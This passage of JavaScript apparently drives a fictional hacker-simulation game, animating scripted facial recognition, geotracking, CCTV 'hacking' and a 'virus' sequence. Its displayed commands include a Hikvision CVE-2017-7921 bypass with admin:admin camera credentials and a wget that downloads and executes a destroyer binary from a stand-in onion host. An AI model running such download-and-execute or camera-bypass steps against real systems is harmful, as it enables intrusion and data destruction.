        document.getElementById('encrypted-file-window').classList.remove('show');
        
        // Transition to intelligence interface
        document.getElementById('main-console').classList.remove('active');
        document.getElementById('intelligence-interface').classList.add('active');
        
        // Start facial recognition phase
        this.currentPhase = 'facial-recognition';
        this.commandInput = '';
        this.commandStep = 0;
        this.commands = [
            'facialrec --scan --database GLOBAL_INTEL_DB --algorithm DEEP_NEURAL --confidence 0.85 --target DR_MARCUS_STEELE'
        ];
        this.facialScanActive = false;
    }

    handleFacialRecognitionTyping() {
        if (this.facialScanActive) {
            return; // Don't allow more typing during scan
        }
        
        // If facial recognition is complete, switch to location tracking
        if (this.facialRecognitionComplete) {
            const commandInput = document.getElementById('command-input');
            
            // Check if user is starting a location command
            if (this.commandInput.length < 'geotrack --init'.length) {
                this.commandInput += 'geotrack --init'[this.commandInput.length];
                commandInput.textContent = this.commandInput;
                
                // If command is complete, start location tracking
                if (this.commandInput === 'geotrack --init') {
                    this.executeLocationInitCommand();
                }
            }
            return;
        }
        
        // If facial recognition commands are complete but scan hasn't run yet
        if (this.commandStep >= this.commands.length) {
            return; // Wait for scan to complete
        }
        
        const currentCommand = this.commands[this.commandStep];
        const commandInput = document.getElementById('command-input');
        
        // Add character to current command
        if (this.commandInput.length < currentCommand.length) {
            this.commandInput += currentCommand[this.commandInput.length];
            commandInput.textContent = this.commandInput;
        }
        
        // When command is complete, start the automated facial recognition
        if (this.commandInput.length === currentCommand.length) {
            this.startAutomatedFacialRecognition();
        }
    }

    startAutomatedFacialRecognition() {
        const output = document.getElementById('command-output');
        const commandInput = document.getElementById('command-input');
        
        // Add executed command to output
        output.innerHTML += `<div class="status-line"><span class="status-label">EXECUTED:</span><span class="status-text">facialrec --scan</span></div>`;
        output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Initiating facial recognition scan...</span></div>`;
        
        // Clear input and prevent further typing
        commandInput.textContent = '';
        this.facialScanActive = true;
        
        // Show popup and start scanning sequence
        this.showScanningPopup();
        
        // Start the image sequence after a brief delay
        setTimeout(() => {
            this.runFacialScanSequence();
        }, 1000);
    }

    showScanningPopup() {
        const popup = document.getElementById('facial-scan-popup');
        const statusText = document.getElementById('scan-status-text');
        statusText.textContent = 'SCANNING FACES...';
        popup.classList.add('show');
    }

    runFacialScanSequence() {
        // Initialize the facial recognition display
        this.initializeFacialDisplay();
        
        // Run through the sequence: transition2 -> other -> transition1 -> target
        setTimeout(() => {
            this.crossfadeToNextImage('images/transition2.png', 'MAPPING FACIAL STRUCTURE...');
        }, 2000);
        
        setTimeout(() => {
            this.crossfadeToNextImage('images/other_face.png', 'SCANNING: NO MATCH');
        }, 5000);
        
        setTimeout(() => {
            this.crossfadeToNextImage('images/transition1.png', 'ANALYZING TARGET...');
        }, 8000);
        
        setTimeout(() => {
            this.crossfadeToTargetMatch();
            this.showMatchFoundPopup();
        }, 11000);
    }

    initializeFacialDisplay() {
        const faceImage1 = document.getElementById('face-image-1');
        const faceImage2 = document.getElementById('face-image-2');
        const hudOverlay = document.getElementById('hud-overlay');
        
        // Initialize with transition2 image
        this.currentImageIndex = 1;
        faceImage1.src = 'images/transition2.png';
        faceImage1.style.display = 'block';
        faceImage1.style.opacity = '1';
        faceImage2.style.display = 'block';
        faceImage2.style.opacity = '0';
        hudOverlay.style.display = 'block';
        
        this.addHudOverlay('INITIALIZING SCAN...');
    }

    showMatchFoundPopup() {
        const popup = document.getElementById('facial-scan-popup');
        const statusText = document.getElementById('scan-status-text');
        statusText.textContent = 'MATCH FOUND';
        statusText.style.color = '#00ffc4';
        
        // Hide popup after 2 seconds and mark facial recognition as complete
        setTimeout(() => {
            popup.classList.remove('show');
            // Mark facial recognition as completed, ready for location tracking
            this.facialScanActive = false;
            this.facialRecognitionComplete = true;
            this.commandStep = 0;
            this.commandInput = '';
            document.getElementById('command-input').textContent = '';
        }, 2000);
    }

    executeCommand(command) {
        const output = document.getElementById('command-output');
        const commandInput = document.getElementById('command-input');
        
        // Add executed command to output
        output.innerHTML += `<div class="status-line"><span class="status-label">EXECUTED:</span><span class="status-text">${command}</span></div>`;
        
        // Clear input
        commandInput.textContent = '';
        
        // Execute the appropriate facial recognition step - use commandStep - 1 since we incremented it
        const stepIndex = this.commandStep - 1;
        switch(stepIndex) {
            case 0: // facialrec --init
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Facial recognition system initialized. Ready for scan command.</span></div>`;
                // Don't show face yet, wait for scan command
                break;
            case 1: // facialrec --scan --deep
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Deep scan initiated - analyzing facial structure</span></div>`;
                this.startFacialRecognitionScan(); // Show the first face immediately
                break;
            case 2: // facialrec --enhance --target
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Enhancing target definition - crossreferencing database</span></div>`;
                this.crossfadeToNextImage('images/transition2.png', 'MAPPING FACIAL STRUCTURE...');
                break;
            case 3: // facialrec --match --confirm
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Target analysis in progress - matching against database</span></div>`;
                this.crossfadeToNextImage('images/transition1.png', 'ANALYZING TARGET...');
                break;
            case 4: // facialrec --verify --complete
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Target match confirmed! Dr. Marcus Steele identified</span></div>`;
                this.crossfadeToTargetMatch();
                break;
        }
        
        // Auto-scroll output
        output.scrollTop = output.scrollHeight;
    }

    startFacialRecognitionScan() {
        // Start with other face
        const faceImage1 = document.getElementById('face-image-1');
        const faceImage2 = document.getElementById('face-image-2');
        const hudOverlay = document.getElementById('hud-overlay');
        
        // Initialize the crossfade system
        this.currentImageIndex = 1; // Track which image is currently visible
        
        // Start with other_face.png on image 1
        faceImage1.src = 'images/other_face.png';
        faceImage1.style.display = 'block';
        faceImage1.style.opacity = '1';
        faceImage2.style.display = 'block';
        faceImage2.style.opacity = '0';
        hudOverlay.style.display = 'block';
        
        // Add HUD overlay content
        this.addHudOverlay('SCANNING: NO MATCH');
    }

    addHudOverlay(labelText = 'SCANNING: NO MATCH') {
        const hudOverlay = document.getElementById('hud-overlay');
        hudOverlay.innerHTML = `
            <div class="vignette"></div>
            <div class="scanlines"></div>
            <div class="vertical-scan"></div>
            <div class="radial-sweep"></div>
            <div class="frame"></div>
            <div class="label">${labelText}</div>
            <div class="glitch-slice">
                <div class="slice"></div>
                <div class="slice"></div>
                <div class="slice"></div>
            </div>
            <svg class="crosshair" viewBox="0 0 120 120">
                <circle cx="60" cy="60" r="46" fill="none" stroke="var(--hud-cyan)" stroke-width="0.9" opacity=".9"/>
                <line x1="60" y1="14" x2="60" y2="28" stroke="var(--hud-cyan)" stroke-width="0.9" />
                <line x1="60" y1="92" x2="60" y2="106" stroke="var(--hud-cyan)" stroke-width="0.9" />
                <line x1="14" y1="60" x2="28" y2="60" stroke="var(--hud-cyan)" stroke-width="0.9" />
                <line x1="92" y1="60" x2="106" y2="60" stroke="var(--hud-cyan)" stroke-width="0.9" />
            </svg>
            <div class="tint"></div>
        `;
    }

    crossfadeToNextImage(newSrc, labelText) {
        const faceImage1 = document.getElementById('face-image-1');
        const faceImage2 = document.getElementById('face-image-2');
        
        if (this.currentImageIndex === 1) {
            // Load new image on image 2 first
            faceImage2.onload = () => {
                // Once loaded, start crossfade
                faceImage2.style.opacity = '1';
                faceImage1.style.opacity = '0';
                this.currentImageIndex = 2;
            };
            faceImage2.src = newSrc;
        } else {
            // Load new image on image 1 first
            faceImage1.onload = () => {
                // Once loaded, start crossfade
                faceImage1.style.opacity = '1';
                faceImage2.style.opacity = '0';
                this.currentImageIndex = 1;
            };
            faceImage1.src = newSrc;
        }
        
        // Update label
        this.addHudOverlay(labelText);
    }

    crossfadeToTargetMatch() {
        console.log('crossfadeToTargetMatch called - attempting to show target face');
        
        // Use direct crossfade logic instead of calling the other method
        const faceImage1 = document.getElementById('face-image-1');
        const faceImage2 = document.getElementById('face-image-2');
        
        console.log('Current image index:', this.currentImageIndex);
        
        if (this.currentImageIndex === 1) {
            // Load target image on image 2 first
            faceImage2.onload = () => {
                console.log('Target image loaded, starting crossfade');
                faceImage2.style.opacity = '1';
                faceImage1.style.opacity = '0';
                this.currentImageIndex = 2;
            };
            faceImage2.src = 'images/target_face.png';
        } else {
            // Load target image on image 1 first
            faceImage1.onload = () => {
                console.log('Target image loaded, starting crossfade');
                faceImage1.style.opacity = '1';
                faceImage2.style.opacity = '0';
                this.currentImageIndex = 1;
            };
            faceImage1.src = 'images/target_face.png';
        }
        
        // Update HUD immediately
        this.addHudOverlay('MATCH CONFIRMED: DR. MARCUS STEELE');
        setTimeout(() => {
            const label = document.querySelector('.label');
            if (label) {
                label.style.color = '#00ffc4';
            }
        }, 100);
    }

    executeLocationInitCommand() {
        const output = document.getElementById('command-output');
        
        // Add executed command to output
        output.innerHTML += `<div class="status-line"><span class="status-label">EXECUTED:</span><span class="status-text">geotrack --init</span></div>`;
        output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Location tracking systems initialized</span></div>`;
        
        // Clear input and start location tracking
        document.getElementById('command-input').textContent = '';
        this.startLocationTracking();
        
        // Auto-scroll output
        output.scrollTop = output.scrollHeight;
    }

    startLocationTracking() {
        // Set up location tracking commands
        this.currentPhase = 'location-tracking';
        this.commandInput = '';
        this.commandStep = 0;
        this.commands = [
            'locate --target STEELE_MARCUS --sat-grid OMEGA-7 --triangulate 47.2156N:8.4721E',
            'geotrack --enhance --zoom-level 15 --resolution HIGH --filter THERMAL', 
            'geotrack --enhance --zoom-level 25 --resolution MAXIMUM --pinpoint URBAN-CENTER'
        ];
        this.locationLevel = 'globe'; // Track current zoom level
    }

    handleLocationTrackingTyping() {
        // Don't allow typing if locating popup is active or if all commands are complete
        if (this.locatingActive || this.commandStep >= this.commands.length) {
            return;
        }
        
        const currentCommand = this.commands[this.commandStep];
        const commandInput = document.getElementById('command-input');
        
        // Add character to current command
        if (this.commandInput.length < currentCommand.length) {
            this.commandInput += currentCommand[this.commandInput.length];
            commandInput.textContent = this.commandInput;
        }
        
        // When command is complete, execute it
        if (this.commandInput.length === currentCommand.length) {
            this.executeLocationCommand();
        }
    }

    executeLocationCommand() {
        const output = document.getElementById('command-output');
        const commandInput = document.getElementById('command-input');
        
        // Add executed command to output
        output.innerHTML += `<div class="status-line"><span class="status-label">EXECUTED:</span><span class="status-text">${this.commands[this.commandStep]}</span></div>`;
        
        // Show locating popup immediately and prevent further typing
        this.showLocatingPopup();
        
        switch(this.commandStep) {
            case 0: // locate --target
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Satellite triangulation initiated...</span></div>`;
                setTimeout(() => {
                    output.innerHTML += `<div class="status-line"><span class="status-label">LOCATION:</span><span class="status-text" style="color: #ff4444;">TARGET ACQUIRED - NORTHERN SECTOR</span></div>`;
                    this.showLocationDot();
                    output.scrollTop = output.scrollHeight;
                    this.hideLocatingPopup();
                }, 3000);
                break;
            case 1: // geotrack --enhance
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Enhancing regional resolution...</span></div>`;
                this.updateLocatingPopup('ENHANCING...');
                setTimeout(() => {
                    this.zoomToCountry();
                    this.hideLocatingPopup();
                }, 2500);
                break;
            case 2: // geotrack --zoom
                output.innerHTML += `<div class="status-line"><span class="status-label">STATUS:</span><span class="status-text">Maximum zoom achieved - urban center identified</span></div>`;
                this.updateLocatingPopup('ENHANCING...');
                setTimeout(() => {
                    this.zoomToCity();
                    this.hideLocatingPopup();
                }, 2500);
                break;
        }
        
        // Clear input and move to next command
        commandInput.textContent = '';
        this.commandInput = '';
        this.commandStep++;
        
        // Auto-scroll output
        output.scrollTop = output.scrollHeight;
    }

    showLocationDot() {
        const globeDisplay = document.querySelector('.globe-display');
        
        // Create flashing red dot overlay
        const dot = document.createElement('div');
        dot.className = 'location-dot';
        dot.style.cssText = `
            position: absolute;
            width: 12px;
            height: 12px;
            background: #ff4444;
            border-radius: 50%;
            top: 38%;
            left: 63%;
            z-index: 4;
            box-shadow: 0 0 10px #ff4444;
            animation: locationFlash 1s ease-in-out infinite alternate;
        `;
        
        globeDisplay.appendChild(dot);
        this.locationDot = dot;
    }

    zoomToCountry() {
        const output = document.getElementById('command-output');
        const globeImage = document.getElementById('globe-image');
        const globeDisplay = document.querySelector('.globe-display');
        
        output.innerHTML += `<div class="status-line"><span class="status-label">ZOOM:</span><span class="status-text">Targeting continental region...</span></div>`;
        
        // Create zoom animation from the dot position
        this.createZoomEffect(() => {
            globeImage.src = 'images/country.png';
            this.locationLevel = 'country';
            // Update dot position for country view
            if (this.locationDot) {
                this.locationDot.style.top = '45%';
                this.locationDot.style.left = '60%';
            }
        });
        
        output.scrollTop = output.scrollHeight;
    }

    zoomToCity() {
        const output = document.getElementById('command-output');
        const globeImage = document.getElementById('globe-image');
        
        output.innerHTML += `<div class="status-line"><span class="status-label">ZOOM:</span><span class="status-text">Urban center acquired</span></div>`;
        
        setTimeout(() => {
            output.innerHTML += `<div class="status-line"><span class="status-label">LOCATION:</span><span class="status-text" style="color: #00ffc4;">CONFIRMED: NEW MERIDIAN CITY</span></div>`;
            output.innerHTML += `<div class="status-line"><span class="status-label">COORDINATES:</span><span class="status-text" style="color: #00ffc4;">47.2156° N, 8.4721° E</span></div>`;
            output.scrollTop = output.scrollHeight;
        }, 1000);
        
        // Create zoom animation to city
        this.createZoomEffect(() => {
            globeImage.src = 'images/city.png';
            this.locationLevel = 'city';
            // Update dot position for city view
            if (this.locationDot) {
                this.locationDot.style.top = '40%';
                this.locationDot.style.left = '50%';
            }
            
            // Mark location tracking as complete and ready for CCTV
            this.locationTrackingComplete = true;
            this.currentPhase = 'cctv-surveillance';
            this.commandInput = '';
            this.keyPressCount = 0;
        });
    }

    createZoomEffect(callback) {
        const globeDisplay = document.querySelector('.globe-display');
        
        // Create zoom border effect originating from the dot
        const zoomBorder = document.createElement('div');
        zoomBorder.className = 'zoom-border';
        zoomBorder.style.cssText = `
            position: absolute;
            border: 3px solid rgba(0, 212, 170, 0.8);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            top: ${this.locationDot ? this.locationDot.style.top : '35%'};
            left: ${this.locationDot ? this.locationDot.style.left : '55%'};
            transform: translate(-50%, -50%);
            z-index: 5;
            animation: zoomExpand 1s ease-out forwards;
        `;
        
        globeDisplay.appendChild(zoomBorder);
        
        // Execute callback after animation
        setTimeout(() => {
            callback();
            zoomBorder.remove();
        }, 1000);
    }

    showLocatingPopup() {
        const popup = document.getElementById('locating-popup');
        const statusText = document.getElementById('locating-status-text');
        statusText.textContent = 'LOCATING...';
        popup.classList.add('show');
        this.locatingActive = true;
    }

    hideLocatingPopup() {
        const popup = document.getElementById('locating-popup');
        popup.classList.remove('show');
        this.locatingActive = false;
    }

    updateLocatingPopup(text) {
        const statusText = document.getElementById('locating-status-text');
        statusText.textContent = text;
    }

    resetInputState() {
        // Clear any accumulated input and reset typing state
        this.commandInput = '';
        this.keyPressCount = 0;
        
        // Clear terminal input display
        const terminalInput = document.getElementById('terminal-input');
        if (terminalInput) {
            terminalInput.textContent = '';
        }
        
        // Clear command input display
        const commandInput = document.getElementById('command-input');
        if (commandInput) {
            commandInput.textContent = '';
        }
    }

    handleCCTVSurveillanceTyping() {
        this.keyPressCount++;
        
        // After 15 keypresses, show terminal for CCTV hack
        if (this.keyPressCount >= 15) {
            this.showCCTVTerminal();
        }
    }

    showCCTVTerminal() {
        const terminal = document.getElementById('terminal-window');
        terminal.classList.add('show');
        
        // Clear previous content
        document.getElementById('terminal-output').innerHTML = '';
        document.getElementById('terminal-input').textContent = '';
        
        // Ensure input line is visible
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
        }
        
        this.currentPhase = 'cctv-terminal';
        this.cctvCommands = [
            'netscan --range 192.168.1.0/24 --port 554 --protocol RTSP',
            'exploit --target 192.168.1.15 --service HIKVISION --cve CVE-2017-7921',
            'cctv --access --camera CAM-03 --stream-url rtsp://admin:admin@192.168.1.15/live'
        ];
        this.currentCCTVCommand = 0;
    }

    handleCCTVTerminalTyping() {
        if (this.currentCCTVCommand < this.cctvCommands.length) {
            const command = this.cctvCommands[this.currentCCTVCommand];
            const currentInput = document.getElementById('terminal-input').textContent;
            
            if (currentInput.length < command.length) {
                document.getElementById('terminal-input').textContent = command.substring(0, currentInput.length + 1);
                
                // Force scroll to bottom
                const terminalContent = document.querySelector('.terminal-content');
                terminalContent.scrollTop = terminalContent.scrollHeight;
            } else {
                this.executeCCTVCommand();
            }
        }
    }

    executeCCTVCommand() {
        if (this.cctvCommandExecuting) return;
        this.cctvCommandExecuting = true;
        
        const output = document.getElementById('terminal-output');
        const command = this.cctvCommands[this.currentCCTVCommand];
        
        // Hide input line and add command to output
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) inputLine.style.display = 'none';
        
        output.innerHTML += `<div class="terminal-line"><span class="prompt">root@nightfall:~$ </span>${command}</div>`;
        
        let response = '';
        switch(this.currentCCTVCommand) {
            case 0:
                response = '[+] Network scan initiated...<br>Host 192.168.1.15 - OPEN PORT 554/tcp (RTSP)<br>Device: HIKVISION DS-2CD2142FWD-I<br>Service: IP Camera RTSP Stream<br>Firmware: V5.4.5 build 170124<br>[!] Known vulnerabilities detected';
                break;
            case 1:
                response = '[+] Exploiting HIKVISION authentication bypass...<br>[+] CVE-2017-7921 - Privilege escalation successful<br>[+] Administrative access obtained<br>[+] Camera authentication bypassed<br>[+] RTSP stream access granted';
                break;
            case 2:
                response = '[+] Connecting to camera feed...<br>[+] RTSP stream established<br>[+] Video feed acquired: 1920x1080@30fps<br>[+] Camera control interface active<br><span style="color: #00ffc4;">[SUCCESS] CCTV ACCESS GRANTED - CAM-03</span>';
                break;
        }
        
        output.innerHTML += `<div style="color: #00ffc4; margin-bottom: 10px;">${response}</div>`;
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
        
        this.currentCCTVCommand++;
        document.getElementById('terminal-input').textContent = '';
        this.cctvCommandExecuting = false;
        
        // Show input line for next command
        if (this.currentCCTVCommand < this.cctvCommands.length) {
            const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
            if (inputLine) {
                inputLine.style.display = 'block';
                this.resetInputState();
            }
        }
        
        // After final command, show CCTV window
        if (this.currentCCTVCommand >= this.cctvCommands.length) {
            setTimeout(() => {
                this.showCCTVWindow();
                // Mark CCTV as complete, ready for user to run satellite commands
                this.cctvComplete = true;
                // User can now type satellite commands if they choose
                this.currentPhase = 'cctv-complete';
                this.keyPressCount = 0; // Reset for satellite command detection
            }, 2000);
        }
    }

    showCCTVWindow() {
        const cctvWindow = document.getElementById('cctv-window');
        cctvWindow.classList.add('show');
        
        // Start timestamp updating
        this.updateCCTVTimestamp();
        setInterval(() => this.updateCCTVTimestamp(), 1000);
    }

    updateCCTVTimestamp() {
        const timestamp = document.getElementById('cctv-timestamp');
        const now = new Date();
        const timeString = now.toISOString().slice(0, 19).replace('T', ' ');
        timestamp.textContent = timeString;
    }

    handleCCTVCompleteTyping() {
        // User can now type satellite commands if they want
        // Check if they're starting satellite commands
        this.keyPressCount++;
        
        // After a few keypresses, transition to satellite commands
        if (this.keyPressCount >= 3) {
            this.startSatelliteCommands();
        }
    }

    startSatelliteCommands() {
        // Clear terminal and set up for satellite commands (without automatic message)
        this.currentPhase = 'satellite-terminal';
        this.satelliteCommands = [
            'satcom --connect --frequency 11.7GHz --satellite ASTRA-2G --uplink-auth OMEGA_7749',
            'satcom --handshake --encryption AES256 --key NIGHTFALL_MASTER_KEY_2024',
            'upload --data TARGET_INTEL.enc --destination SAFEHOUSE_ALPHA --priority URGENT'
        ];
        this.currentSatelliteCommand = 0;
        
        // Show input line for satellite commands and reset input state
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
            this.resetInputState();
        }
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
    }

    startSatellitePhase() {
        // Clear terminal and set up for satellite commands
        document.getElementById('terminal-output').innerHTML += '<div style="color: #00ffc4; margin: 10px 0;">[+] CCTV access complete - initiating satellite uplink...</div>';
        
        this.currentPhase = 'satellite-terminal';
        this.satelliteCommands = [
            'satcom --connect --frequency 11.7GHz --satellite ASTRA-2G --uplink-auth OMEGA_7749',
            'satcom --handshake --encryption AES256 --key NIGHTFALL_MASTER_KEY_2024',
            'upload --data TARGET_INTEL.enc --destination SAFEHOUSE_ALPHA --priority URGENT'
        ];
        this.currentSatelliteCommand = 0;
        
        // Show input line for satellite commands and reset input state
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
            this.resetInputState();
        }
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
    }

    handleSatelliteTerminalTyping() {
        if (this.currentSatelliteCommand < this.satelliteCommands.length) {
            const command = this.satelliteCommands[this.currentSatelliteCommand];
            const currentInput = document.getElementById('terminal-input').textContent;
            
            if (currentInput.length < command.length) {
                document.getElementById('terminal-input').textContent = command.substring(0, currentInput.length + 1);
                
                // Force scroll to bottom
                const terminalContent = document.querySelector('.terminal-content');
                terminalContent.scrollTop = terminalContent.scrollHeight;
            } else {
                this.executeSatelliteCommand();
            }
        }
    }

    executeSatelliteCommand() {
        if (this.satelliteCommandExecuting) return;
        this.satelliteCommandExecuting = true;
        
        const output = document.getElementById('terminal-output');
        const command = this.satelliteCommands[this.currentSatelliteCommand];
        
        // Hide input line and add command to output
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) inputLine.style.display = 'none';
        
        output.innerHTML += `<div class="terminal-line"><span class="prompt">root@nightfall:~$ </span>${command}</div>`;
        
        let response = '';
        switch(this.currentSatelliteCommand) {
            case 0:
                response = '[+] Scanning orbital frequencies...<br>[+] Satellite ASTRA-2G located at 28.2°E<br>[+] Establishing uplink connection...<br>[+] Authentication successful - OMEGA clearance confirmed<br><span style="color: #00ffc4;">[SUCCESS] SATELLITE UPLINK ACTIVE</span>';
                setTimeout(() => this.showSatelliteWindow(), 2000);
                break;
            case 1:
                response = '[+] Initiating encrypted handshake...<br>[+] AES-256 encryption negotiated<br>[+] Master key verification complete<br>[+] Secure communication channel established<br><span style="color: #00ffc4;">[SUCCESS] ENCRYPTED TUNNEL READY</span>';
                this.updateSatelliteStatus('CONNECTED', '█████████░ 94%');
                break;
            case 2:
                response = '[+] Uploading target intelligence data...<br>[+] Destination: SAFEHOUSE_ALPHA coordinates confirmed<br>[+] Data package: 2.4MB encrypted intel - estimated upload time: 47 seconds<br>[+] Priority transmission authorized<br><span style="color: #00ffc4;">[SUCCESS] DATA UPLOAD INITIATED</span>';
                this.startPayloadUpload();
                break;
        }
        
        output.innerHTML += `<div style="color: #00ffc4; margin-bottom: 10px;">${response}</div>`;
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
        
        this.currentSatelliteCommand++;
        document.getElementById('terminal-input').textContent = '';
        this.satelliteCommandExecuting = false;
        
        // Show input line for next command
        if (this.currentSatelliteCommand < this.satelliteCommands.length) {
            setTimeout(() => {
                const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
                if (inputLine) {
                    inputLine.style.display = 'block';
                    this.resetInputState();
                }
            }, 2000);
        }
    }

    showSatelliteWindow() {
        const satelliteWindow = document.getElementById('satellite-window');
        satelliteWindow.classList.add('show');
    }

    updateSatelliteStatus(uplink, signal) {
        document.getElementById('sat-uplink').textContent = uplink;
        document.getElementById('sat-signal').textContent = signal;
        
        if (uplink === 'CONNECTED') {
            document.getElementById('sat-uplink').style.color = '#00ffc4';
        }
    }

    startPayloadUpload() {
        const progressFill = document.getElementById('upload-progress');
        const progressText = document.getElementById('upload-text');
        const transferSpeed = document.getElementById('transfer-speed');
        const transferEta = document.getElementById('transfer-eta');
        let progress = 0;
        let startTime = Date.now();
        
        const uploadInterval = setInterval(() => {
            progress += Math.random() * 8 + 2; // Random increment between 2-10%
            if (progress > 100) progress = 100;
            
            // Calculate realistic stats
            const elapsed = (Date.now() - startTime) / 1000;
            const speed = Math.floor(Math.random() * 200 + 150); // 150-350 KB/s
            const remaining = progress < 100 ? Math.floor(((100 - progress) / progress) * elapsed) : 0;
            const eta = remaining > 0 ? `${Math.floor(remaining / 60).toString().padStart(2, '0')}:${(remaining % 60).toString().padStart(2, '0')}` : '00:00';
            
            progressFill.style.width = progress + '%';
            transferSpeed.textContent = `${speed} KB/s`;
            transferEta.textContent = eta;
            
            if (progress < 100) {
                progressText.textContent = `${Math.floor(progress)}% - UPLOADING TARGET INTEL...`;
            } else {
                progressText.textContent = '100% - UPLOAD COMPLETE - DATA TRANSMITTED';
                progressText.style.color = '#00ffc4';
                transferSpeed.textContent = '0 KB/s';
                transferEta.textContent = '00:00';
                clearInterval(uploadInterval);
                
                // Show completion in terminal and mark satellite as complete
                setTimeout(() => {
                    const output = document.getElementById('terminal-output');
                    output.innerHTML += '<div style="color: #00ffc4; margin: 10px 0;">[SUCCESS] Data transmitted to SAFEHOUSE_ALPHA</div>';
                    
                    const terminalContent = document.querySelector('.terminal-content');
                    terminalContent.scrollTop = terminalContent.scrollHeight;
                    
                    // Mark satellite upload as complete, user can now run virus commands
                    this.satelliteComplete = true;
                    this.currentPhase = 'satellite-complete';
                    this.keyPressCount = 0; // Reset for virus command detection
                }, 1000);
            }
        }, 800);
    }

    handleSatelliteCompleteTyping() {
        // User can now type virus commands if they want
        // Check if they're starting virus commands
        this.keyPressCount++;
        
        // After a few keypresses, transition to virus commands
        if (this.keyPressCount >= 3) {
            this.startVirusCommands();
        }
    }

    startVirusCommands() {
        // Set up virus commands without the automatic destruction message
        this.currentPhase = 'virus-terminal';
        this.virusCommands = [
            'wget https://darkweb.onion/tools/SYSTEM_DESTROYER.exe -O /tmp/destroyer.exe',
            'chmod +x /tmp/destroyer.exe && /tmp/destroyer.exe --target ALL --method CASCADE_FAILURE'
        ];
        this.currentVirusCommand = 0;
        
        // Show input line and reset state
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
            this.resetInputState();
        }
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
    }

    startVirusPhase() {
        // Add message to terminal about beginning system destruction
        const output = document.getElementById('terminal-output');
        output.innerHTML += '<div style="color: #ff4444; margin: 10px 0; font-weight: bold;">[WARNING] Beginning system destruction sequence...</div>';
        
        this.currentPhase = 'virus-terminal';
        this.virusCommands = [
            'wget https://darkweb.onion/tools/SYSTEM_DESTROYER.exe -O /tmp/destroyer.exe',
            'chmod +x /tmp/destroyer.exe && /tmp/destroyer.exe --target ALL --method CASCADE_FAILURE'
        ];
        this.currentVirusCommand = 0;
        
        // Show input line and reset state
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) {
            inputLine.style.display = 'block';
            this.resetInputState();
        }
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
    }

    handleVirusTerminalTyping() {
        if (this.currentVirusCommand < this.virusCommands.length) {
            const command = this.virusCommands[this.currentVirusCommand];
            const currentInput = document.getElementById('terminal-input').textContent;
            
            if (currentInput.length < command.length) {
                document.getElementById('terminal-input').textContent = command.substring(0, currentInput.length + 1);
                
                // Force scroll to bottom
                const terminalContent = document.querySelector('.terminal-content');
                terminalContent.scrollTop = terminalContent.scrollHeight;
            } else {
                this.executeVirusCommand();
            }
        }
    }

    executeVirusCommand() {
        if (this.virusCommandExecuting) return;
        this.virusCommandExecuting = true;
        
        const output = document.getElementById('terminal-output');
        const command = this.virusCommands[this.currentVirusCommand];
        
        // Hide input line and add command to output
        const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
        if (inputLine) inputLine.style.display = 'none';
        
        output.innerHTML += `<div class="terminal-line"><span class="prompt">root@nightfall:~$ </span>${command}</div>`;
        
        let response = '';
        switch(this.currentVirusCommand) {
            case 0:
                response = '--2024-10-13 23:58:47--  https://darkweb.onion/tools/SYSTEM_DESTROYER.exe<br>Resolving darkweb.onion... 127.0.0.1<br>Connecting to darkweb.onion:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 8472 (8.3K) [application/octet-stream]<br>Saving to: \'/tmp/destroyer.exe\'<br><br>/tmp/destroyer.exe  100%[===================>]   8.27K  --.-KB/s    in 0s<br><br><span style="color: #ff4444;">[SUCCESS] System destroyer downloaded</span>';
                break;
            case 1:
                response = '<span style="color: #ff4444;">[VIRUS] Initiating cascade failure protocol...<br>[VIRUS] Targeting system components: ALL<br>[VIRUS] Corrupting boot sectors...<br>[VIRUS] Destroying file allocation tables...<br>[VIRUS] Overwriting system registry...<br>[VIRUS] CASCADE FAILURE INITIATED</span>';
                // Start the screen destruction effects
                setTimeout(() => this.startSystemDestruction(), 2000);
                break;
        }
        
        output.innerHTML += `<div style="color: #00ffc4; margin-bottom: 10px;">${response}</div>`;
        
        // Scroll terminal
        const terminalContent = document.querySelector('.terminal-content');
        terminalContent.scrollTop = terminalContent.scrollHeight;
        
        this.currentVirusCommand++;
        document.getElementById('terminal-input').textContent = '';
        this.virusCommandExecuting = false;
        
        // Show input line for next command
        if (this.currentVirusCommand < this.virusCommands.length) {
            setTimeout(() => {
